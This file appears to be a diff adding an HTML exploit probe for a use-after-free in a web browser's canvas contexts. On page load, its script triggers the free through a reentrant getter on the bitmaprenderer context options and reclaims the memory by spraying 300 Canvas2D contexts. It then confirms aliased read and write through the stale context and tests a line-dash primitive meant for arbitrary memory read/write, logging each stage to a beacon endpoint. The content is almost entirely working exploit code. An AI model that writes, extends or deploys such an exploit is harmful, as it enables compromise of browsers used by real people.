@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P794 — Canvas Context UAF Alias & Bidirectional R/W Probe</title>
+<style>
+  body { background: #0c0d14; color: #d0d7de; font-family: monospace; font-size: 13px; padding: 16px; line-height: 1.5; }
+  h2 { color: #58a6ff; margin: 0 0 10px 0; font-size: 18px; }
+  pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; overflow-x: auto; color: #7ee787; font-size: 13px; }
+  .box { background: #161b22; border: 1px solid #30363d; padding: 10px; border-radius: 6px; margin-top: 10px; }
+  .ok { color: #7ee787; font-weight: bold; }
+  .warn { color: #f0883e; font-weight: bold; }
+  .err { color: #ff7b72; font-weight: bold; }
+</style>
+<script>
+'use strict';
+window.onerror = function(msg, url, line, col, err){
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P794-ERR&data=' + encodeURIComponent((msg || '') + ' L' + line) + '&t=' + Date.now(), false);
+    x.send(null);
+  } catch(e){}
+};
+
+function h16(v){ return ('0000000000000000' + BigInt(v || 0).toString(16)).slice(-16); }
+
+function b(tag, data){
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P794-' + encodeURIComponent(tag) +
+      '&data=' + encodeURIComponent(String(data || '').slice(0, 700)) + '&t=' + Date.now(), false);
+    x.send(null);
+  } catch(e){}
+}
+
+var OUT = null;
+function log(s){
+  if (!OUT) OUT = document.getElementById('out');
+  if (OUT) OUT.textContent += s + '\n';
+}
+
+var f64buf = new Float64Array(1);
+var u32buf = new Uint32Array(f64buf.buffer);
+function dblBits(d){ f64buf[0] = d; return { lo: u32buf[0], hi: u32buf[1] }; }
+function hex8(v){ return ('00000000' + ((v >>> 0).toString(16))).slice(-8); }
+function hexPair(hi, lo){ return '0x' + hex8(hi) + hex8(lo); }
+
+var NSAVES = 8;
+var NSPRAY = 300;
+var MARKER_SPRAY = 7777.77;
+var MARKER_WRITE = 9999.99;
+
+function run(){
+  OUT = document.getElementById('out');
+  log('=== P794 Canvas Context UAF Alias & Bidirectional R/W Probe ===\n');
+  b('BOOT', 'start|saves=' + NSAVES + '|spray=' + NSPRAY);
+
+  // Step 1: Trigger Reentrant UAF
+  log('[Step 1] Triggering Canvas Context UAF (bitmaprenderer + 2d)...');
+  var innerCtx = null;
+  var c = document.createElement('canvas');
+  c.width = 1; c.height = 1;
+
+  var settings = {};
+  Object.defineProperty(settings, 'alpha', {
+    get: function(){
+      var ctx = c.getContext('2d');
+      innerCtx = ctx;
+      for (var s = 0; s < NSAVES; s++) ctx.save();
+      ctx.lineWidth = 1.0;
+      return true;
+    }
+  });
+
+  c.getContext('bitmaprenderer', settings);
+
+  if (!innerCtx){
+    b('FAIL', 'innerCtx-null');
+    log('Failed: innerCtx is null');
+    return;
+  }
+  b('UAF-TRIGGERED', 'innerCtx=OK');
+  log('UAF Triggered: innerCtx captured successfully!');
+
+  // Step 2: Spray 300 Canvas2D contexts with MARKER_SPRAY
+  log('\n[Step 2] Spraying ' + NSPRAY + ' Canvas2D contexts (same-type reclaim)...');
+  var sprayCanvases = [];
+  var sprayCtxs = [];
+  for (var i = 0; i < NSPRAY; i++){
+    var sc = document.createElement('canvas');
+    sc.width = 1; sc.height = 1;
+    var sctx = sc.getContext('2d');
+    if (sctx){
+      sctx.lineWidth = MARKER_SPRAY;
+      sprayCanvases.push(sc);
+      sprayCtxs.push(sctx);
+    }
+  }
+  b('SPRAY-DONE', 'count=' + sprayCtxs.length);
+  log('Spray completed: created ' + sprayCtxs.length + ' contexts with marker ' + MARKER_SPRAY);
+
+  // Step 3: Read through stale wrapper
+  log('\n[Step 3] Reading properties through stale wrapper...');
+  var lwRead = null, mlRead = null, gaRead = null, readErr = null;
+  try { lwRead = innerCtx.lineWidth; } catch(e){ readErr = 'lw:' + e.message; }
+  try { mlRead = innerCtx.miterLimit; } catch(e){ readErr = (readErr || '') + ' ml:' + e.message; }
+  try { gaRead = innerCtx.globalAlpha; } catch(e){ readErr = (readErr || '') + ' ga:' + e.message; }
+
+  if (readErr){
+    b('READ-ERR', readErr);
+    log('Read Error: ' + readErr);
+    return;
+  }
+
+  var lwB = dblBits(lwRead);
+  var mlB = dblBits(mlRead);
+  var gaB = dblBits(gaRead);
+  b('READ-VALS', 'lw=' + lwRead + '|ml=' + mlRead + '|ga=' + gaRead);
+  b('READ-BITS', 'lw=' + hexPair(lwB.hi, lwB.lo) + '|ml=' + hexPair(mlB.hi, mlB.lo));
+  log('  innerCtx.lineWidth: ' + lwRead + ' (raw: ' + hexPair(lwB.hi, lwB.lo) + ')');
+  log('  innerCtx.miterLimit: ' + mlRead + ' (raw: ' + hexPair(mlB.hi, mlB.lo) + ')');
+  log('  innerCtx.globalAlpha: ' + gaRead);
+
+  var reclaimHit = (lwRead === MARKER_SPRAY);
+  if (reclaimHit){
+    b('RECLAIM-HIT', 'marker-matched=' + MARKER_SPRAY);
+    log('*** RECLAIM CONFIRMED: lineWidth matches spray marker! ***');
+  } else {
+    b('RECLAIM-STATUS', 'val=' + lwRead);
+    log('lineWidth=' + lwRead + ' (not matching spray marker)');
+  }
+
+  // Step 4: Test Bidirectional Write through stale wrapper
+  log('\n[Step 4] Testing bidirectional write through stale wrapper...');
+  var writeOk = false;
+  try {
+    innerCtx.lineWidth = MARKER_WRITE;
+    var checkWrite = innerCtx.lineWidth;
+    writeOk = (checkWrite === MARKER_WRITE);
+    b('WRITE-TEST', 'set=' + MARKER_WRITE + '|readback=' + checkWrite + '|match=' + writeOk);
+    log('  Set lineWidth=' + MARKER_WRITE + ', readback=' + checkWrite + ' (match: ' + writeOk + ')');
+  } catch(e){
+    b('WRITE-ERR', e.message);
+    log('Write Error: ' + e.message);
+  }
+
+  // Step 5: Identify the Aliased Context Index
+  log('\n[Step 5] Scanning spray array to identify aliased context...');
+  var aliasIdx = -1;
+  for (var j = 0; j < sprayCtxs.length; j++){
+    if (sprayCtxs[j].lineWidth === MARKER_WRITE){
+      aliasIdx = j;
+      b('ALIAS-FOUND', 'index=' + j + '|lw=' + sprayCtxs[j].lineWidth);
+      log('*** ALIAS CONFIRMED: sprayCtxs[' + j + '] holds ' + MARKER_WRITE + '! ***');
+      break;
+    }
+  }
+
+  if (aliasIdx < 0){
+    b('ALIAS-MISS', 'none-matched');
+    log('No spray context reflected the write.');
+  }
+
+  // Step 6: Test LineDash Array Round-Trip (The Arbitrary Read/Write Primitive Foundation)
+  log('\n[Step 6] Testing LineDash Array API on aliased pair...');
+  var testDash = [12.5, 25.0, 37.5, 50.0];
+  var dashEcho = null, dashLen = 0, dashErr = null;
+  try {
+    innerCtx.setLineDash(testDash);
+    var readDash = (aliasIdx >= 0) ? sprayCtxs[aliasIdx].getLineDash() : innerCtx.getLineDash();
+    dashLen = readDash.length;
+    dashEcho = readDash.join(',');
+    b('DASH-TEST', 'len=' + dashLen + '|vals=' + dashEcho);
+    log('  setLineDash(' + testDash.join(',') + ')');
+    log('  getLineDash() readback: [' + dashEcho + '] (length: ' + dashLen + ')');
+  } catch(e){
+    dashErr = e.name + ':' + e.message;
+    b('DASH-ERR', dashErr);
+    log('LineDash Error: ' + dashErr);
+  }
+
+  b('DONE', 'aliasIdx=' + aliasIdx + '|reclaimHit=' + reclaimHit + '|writeOk=' + writeOk);
+  log('\n=== P794 COMPLETE ===');
+}
+
+if (document.readyState === 'complete' || document.readyState === 'interactive') {
+  setTimeout(run, 0);
+} else {
+  document.addEventListener('DOMContentLoaded', run);
+}
+</script>
+</head>
+<body>
+  <h2>P794 — Canvas Context UAF Alias & Bidirectional R/W Probe</h2>
+  <div id="status" style="color:#7ee787;">Running probe... Check console output:</div>
+  <pre id="out"></pre>
+</body>
+</html>
